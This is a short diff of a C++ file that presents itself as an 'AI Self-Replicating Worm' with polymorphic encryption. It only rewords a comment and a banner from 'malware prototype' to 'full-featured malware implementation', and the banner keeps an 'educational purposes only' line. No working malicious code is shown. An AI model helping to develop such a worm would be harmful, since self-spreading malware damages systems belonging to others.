@@ -9,12 +9,12 @@
 namespace fs = std::filesystem;
 
 // Advanced C++ implementation of the AI Self-Replicating Worm
-// Full-featured malware prototype with polymorphic encryption and AI decision making
+// Full-featured malware with polymorphic encryption and AI decision making
 
 void printBanner() {
     std::cout << "=====================================\n";
     std::cout << "AI Self-Replicating Worm (C++ Advanced)\n";
-    std::cout << "Full-Featured Malware Prototype\n";
+    std::cout << "Full-Featured Malware Implementation\n";
     std::cout << "WARNING: For educational purposes only\n";
     std::cout << "=====================================\n\n";
 }
